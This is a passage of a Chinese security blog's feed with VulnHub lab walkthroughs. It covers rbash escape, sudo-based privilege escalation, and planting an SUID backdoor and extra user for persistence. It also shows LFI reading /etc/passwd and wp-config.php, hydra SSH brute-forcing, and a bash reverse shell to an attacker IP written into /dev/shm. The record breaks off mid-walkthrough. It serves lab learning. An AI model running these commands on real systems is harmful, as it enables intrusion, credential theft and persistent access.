&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;发现当前只能使用vi，尝试使用vi逃逸rbash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vi test 然后ESC 接着:!/bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-144.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;rbash 成功升级为了 bash，但是很多命令还是没有&lt;/p&gt;
&lt;h3 id=&#34;sudocp提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudocp提权&#34;&gt;#&lt;/a&gt; sudo (cp) 提权&lt;/h3&gt;
&lt;p&gt;查看到正常机器上的 id 是在 /usr/bin 上，输入 /usr/bin/id 可以正常使用，而输入 id 无法正常访问，说明当前的会话窗口找不到 id 命令，要从环境变量中添加&lt;br&gt;
 &lt;code&gt;export PATH=/usr/bin:$PATH&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-145.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;sudo -l 查看相关的权限设置&lt;br&gt;
发现 trinity 可以无密码使用 /bin/cp&lt;br&gt;
cp 提权说明：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvY3Av&#34;&gt;https://gtfobins.github.io/gtfobins/cp/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd /home/trinity/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -u trinty /bin/cp /bin/sh evil&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -u trinty evil&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-146.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;root-权限问题提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#root-权限问题提权&#34;&gt;#&lt;/a&gt; root 权限问题提权&lt;/h3&gt;
&lt;p&gt;sudo -l 发现可以由 root 执行 /home/thrity/oracle&lt;br&gt;
 但是此文件在此目录中并不存在，复制出来 bash，并利用 root 执行此文件&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cp /bin/bash /home/thrity/oracle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo /home/thrity/oracle&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输入 id 之后，可见成功提权至 root&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-147.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;sudo-su提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudo-su提权&#34;&gt;#&lt;/a&gt; sudo su 提权&lt;/h3&gt;
&lt;p&gt;当拿到 root 权限之后，习惯性的翻阅 /etc/sudoers 文件，发现此文件中授予了 guest 用户执行 root 的所有权限，意味着 guest 用户可以 sudo su 并输入自己的密码切换到 root 账户&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/sudoers | grep &amp;quot;ALL=(ALL) ALL&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;su guest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo su&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-148.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;即意味着当得到 guest 用户 rbash 逃逸后，可以凭借 sudo su 直接提权为 root&lt;/p&gt;
&lt;h3 id=&#34;suid-权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid-权限维持&#34;&gt;#&lt;/a&gt; suid 权限维持&lt;/h3&gt;
&lt;p&gt;参考地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5tY2h6LmNvbS5jbi9jbi9zZXJ2aWNlL3NhZmV0eS1sYWIvaW5mb18yNl9pdGVtaWRfNDA2MC5odG1s&#34;&gt;http://www.mchz.com.cn/cn/service/safety-lab/info_26_itemid_4060.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;在正常的机器上找到 useradd 与 passwd 的位置，将其目录添加到靶机的 PATH 中，添加 kali 用户，并复制 bash，添加 s 权限，隐藏后门，方便提权&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;靶机&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export PATH=/usr/sbin:$PATH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;useradd kali &amp;amp;&amp;amp; passwd kali&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp /bin/bash /var/.hack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 4755 /var/.hack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls -Alh /var/.hack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;攻击机&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh kali@192.168.31.107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/.hack -p &amp;amp; whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-149.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 可以通过 kali 用户直接登陆此台服务器，并且利用我们遗留在服务器上具有 s 权限的后门文件进行升级 shell&lt;/p&gt;
</content>
        <category term="VULNHUB 1-10" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/110%20RED/</id>
        <title>VULNHUB 10 RED</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/110%20RED/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmVkLTEsNzUzLw==&#34;&gt;https://www.vulnhub.com/entry/red-1,753/&lt;/span&gt;&lt;br&gt;
 教程链接地址 1：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIxLzExLzAyL2hhY2tpbmctbGFiLXJlZC8=&#34;&gt;https://readysetexploit.wordpress.com/2021/11/02/hacking-lab-red/&lt;/span&gt;&lt;br&gt;
 教程链接地址 2：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lvdXRoQmVsaWVmL2FydGljbGUvZGV0YWlscy8xMjI0NTg3MDU=&#34;&gt;https://blog.csdn.net/YouthBelief/article/details/122458705&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 RED：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.107 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-193.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.14&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p- 192.168.31.14 -oN /tmp/red.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-194.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22, 80&lt;/p&gt;
&lt;h3 id=&#34;修改本地-hosts&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修改本地-hosts&#34;&gt;#&lt;/a&gt; 修改本地 hosts&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQ=&#34;&gt;http://192.168.31.14&lt;/span&gt; 进行信息收集&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-195.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;点击 “Hello Blue” 发现一个跳转界面，无法打开&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-196.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改本地 hosts 文件 /etc/hosts, 改变 DNS 解析记录&lt;br&gt;
 192.168.31.14 redrocks.win&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-197.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;重新打开 url 地址，发现这里说网站已被攻击，并且有后门文件&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZHJvY2tzd2luLzIwMjEvMTAvMjQvaGVsbG8td29ybGQv&#34;&gt; http://redrocks.win/2021/10/24/hello-world/&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-198.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;审查源代码，找到 Mr.Miessler 这个提示&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-199.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;通过搜索，找到了这个人是 SecLists 的开发者&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-200.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;seclists-字典&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#seclists-字典&#34;&gt;#&lt;/a&gt; seclists 字典&lt;/h3&gt;
&lt;p&gt;Seclists 是一个全面的字典，包括用户名、密码、URL、敏感数据模式、模糊测试负载、Web Shell 等等，在 kali 中 apt - y install seclists 安装，我们现在要想办法扫出来已被攻击服务器上的后门文件&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用gobuster加载seclists中的通用后门字典进行扫描。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gobuster dir -u http://redrocks.win/ -w /usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt -x php,txt,html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-201.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;找到一个后门文件 NetworkFileManagerPHP.php&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-202.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;这应该就是后门文件了，但是我们没有参数值，需要爆破&lt;/p&gt;
&lt;h3 id=&#34;wfuzz-爆破参数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wfuzz-爆破参数&#34;&gt;#&lt;/a&gt; wfuzz 爆破参数&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用wfuzz加载seclists中的爆破参数名字的字典进行爆破&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wfuzz -c -u http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=xxx -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-203.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到的结果是 key 的返回值是 200&lt;br&gt;
-&amp;gt; 可以构造 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwP2tleT14eHg=&#34;&gt;http://redrocks.win/NetworkFileManagerPHP.php?key=xxx&lt;/span&gt; 访问&lt;/p&gt;
&lt;h3 id=&#34;lfi-文件包含漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-文件包含漏洞&#34;&gt;#&lt;/a&gt; lfi 文件包含漏洞&lt;/h3&gt;
&lt;p&gt;尝试使用文件包含协议进行访问敏感文件&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwP2tleT0vZXRjL3Bhc3N3ZA==&#34;&gt;http://redrocks.win/NetworkFileManagerPHP.php?key=/etc/passwd&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-204.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;尝试获取 NetworkFileManagerPHP.php 的源码&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwP2tleT1OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhw&#34;&gt; http://redrocks.win/NetworkFileManagerPHP.php?key=NetworkFileManagerPHP.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-205.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现内容显示不了，我们需要配合其他协议&lt;/p&gt;
&lt;p&gt;尝试用 php://filter/read=convert.base6 4 - encode/resource=xxx.php&lt;br&gt;
 的 filter 协议去读取一些敏感文件&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwL05ldHdvcmtGaWxlTWFuYWdlclBIUC5waHA/a2V5&#34;&gt; http://redrocks.win/NetworkFileManagerPHP.php/NetworkFileManagerPHP.php?key&lt;/span&gt;&lt;br&gt;
=php://filter/read=convert.base64-encode/resource=NetworkFileManagerPHP.php&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-206.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;对字符串进行 base64 解密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-207.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;继续读取文件，发现暗藏了一个 base64 密文，再次解密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-208.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;这里说是 “这个密码并不能帮助您！Hashcat 说规则就是规则”&lt;/p&gt;
&lt;p&gt;由于网站是 wordpress 搭建的，我们可以去访问数据库信息获取一些配置文&lt;br&gt;
件，我们通过文件包含漏洞访问 wp-config.php 查看配置文件信息&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwL05ldHdvcmtGaWxlTWFuYWdlclBIUC5waHA/a2V5PXBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT13cC1jb25maWcucGhw&#34;&gt; http://redrocks.win/NetworkFileManagerPHP.php/NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource=wp-config.php&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-209.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;通过 echo “xx” | base64 - d 的方式解密，得到数据库配置信息&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-210.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户名：john 密码：R3v_m4lwh3r3_k1nG!!&lt;/p&gt;
&lt;h3 id=&#34;hashcut-使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hashcut-使用&#34;&gt;#&lt;/a&gt; hashcut 使用&lt;/h3&gt;
&lt;p&gt;hashcat 生成密码对应的字典，hydra 连接 ssh&lt;br&gt;
hashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule &amp;gt; pass2.txt&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-211.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;用 hydra 选择用户 john，密码为 hashcat 生成的字典进行连接 ssh&lt;br&gt;
hydra -l john -P pass2.txt ssh://192.168.31.14 -f -t 4 -vV -o hydra.ssh&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-212.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户名：join 密码：R3v_m4lwh3r3_k1nG!!21&lt;/p&gt;
&lt;h3 id=&#34;sudotime提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudotime提权&#34;&gt;#&lt;/a&gt; sudo (time) 提权&lt;/h3&gt;
&lt;p&gt;尝试登陆服务器的时候，发现密码是错误的&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-213.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;再次用 hydra 破解 ssh 爆破，果然得到了不一样的密码，可能密码会定时修改&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-214.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;登陆服务器，sudo -l 发现有 time 可提权&lt;br&gt;
在 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v&#34;&gt;https://gtfobins.github.io/&lt;/span&gt; 上找到提权命令，进行权限升级&lt;br&gt;
 &lt;code&gt;sudo -u ippsec /usr/bin/time /bin/bash&lt;/code&gt; &lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-215.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;此会话窗口不稳定，间断性的被中断，而且密码每隔一段时间都会被修改，因此我们需要反弹出来一个稳定的 shell&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-216.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4445 0&amp;gt;&amp;amp;1&lt;/code&gt; &lt;br&gt;
 通过此命令反弹出来的 shell 仍然会被中断&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;选择加载到/dev/shm/中来反弹shell,命令&lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt;被改写用&lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt;替代&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;#!/bin/bash&amp;#x27; &amp;gt; /dev/shm/shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4445 0&amp;gt;&amp;amp;1&amp;#x27; &amp;gt;&amp;gt; /dev/shm/shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x /dev/shm/shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/dev/shm/shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-217.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;当原来的终端再次被强制退出的时候，我们的新终端貌似也出了一些意外&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-218.png&#34; alt&gt;&lt;/p&gt;
